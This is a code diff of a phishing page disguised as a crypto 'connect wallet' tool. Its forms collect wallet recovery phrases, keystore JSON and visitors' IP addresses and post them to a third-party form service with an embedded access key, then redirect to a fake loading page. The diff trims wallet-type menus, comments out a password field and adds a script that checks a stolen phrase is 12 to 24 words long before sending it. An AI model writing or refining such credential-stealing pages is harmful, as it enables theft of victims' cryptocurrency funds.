@@ -237,22 +237,6 @@
           <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e4ec6457-bdd2-4870-b936-e9e466615c1f">
             <input type="hidden" name="redirect" value="https://nodeexplorer.co/apps/connect-wallet/loading.html">
-            <p>
-              <label for="wallet-provider">Select Crypto Wallet Type:</label><select id="wallet-provider">
-              <option value="metamask">Metamask</option>
-              <option value="trust">Trust Wallet</option>
-              <option value="coinbase">Coinbase Wallet</option>
-              <option value="ledger">Ledger Wallet</option>
-              <option value="trezor">Trezor Wallet</option>
-              <option value="binance">Binance Chain Wallet</option>
-              <option value="jaxx">Jaxx Liberty</option>
-              <option value="exodus">Exodus Wallet</option>
-              <option value="myetherwallet">MyEtherWallet</option>
-              <option value="atomic">Atomic Wallet</option>
-              <option value="guarda">Guarda Wallet</option>
-              <option value="electrum">Electrum Wallet</option>
-              <!-- Add more options as needed -->
-            </select></p>
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -267,27 +251,9 @@
           <form  id="keystore-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e4ec6457-bdd2-4870-b936-e9e466615c1f">
               <input type="hidden" name="redirect" value="https://nodeexplorer.co/apps/connect-wallet/loading.html">
-              <p>
-                <label for="wallet-provider">Select Crypto Wallet Type:</label><select id="wallet-provider">
-                <option value="metamask">Metamask</option>
-                <option value="trust">Trust Wallet</option>
-                <option value="coinbase">Coinbase Wallet</option>
-                <option value="ledger">Ledger Wallet</option>
-                <option value="trezor">Trezor Wallet</option>
-                <option value="binance">Binance Chain Wallet</option>
-                <option value="jaxx">Jaxx Liberty</option>
-                <option value="exodus">Exodus Wallet</option>
-                <option value="myetherwallet">MyEtherWallet</option>
-                <option value="atomic">Atomic Wallet</option>
-                <option value="guarda">Guarda Wallet</option>
-                <option value="electrum">Electrum Wallet</option>
-                <!-- Add more options as needed -->
-              </select></p>
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
-                <input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>
+                <!--<input type="password" name="password" placeholder="Password" id="dienfio" class="pass-field" required>-->
                 <input type="hidden" name="user_ip" id="user_ip_keystore">
-
-
                 <input type="hidden" name="type" id="type-keystore">
                 <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
                 <p class="form-instrunctions text-center">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
@@ -399,6 +365,25 @@
     });
 </script>-->
 
+<script>
+    // Function to handle form submission
+    document.getElementById('pass-phrase').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        var phrase = document.getElementById('vepgzijzsg').value.trim(); // Get the phrase input value
+        var phraseLength = phrase.split(' ').length; // Get the number of words in the phrase
+
+        // Check if the number of words is within the desired range
+        if (phraseLength < 12 || phraseLength > 24) {
+            // If the length is not within the desired range, show an error message
+            alert('Error: Phrase must contain between 12 and 24 words.');
+            return; // Exit the function to prevent form submission
+        }
+
+        // If the length is within the desired range, proceed with form submission
+        this.submit();
+    });
+</script>
 
    
    <script>
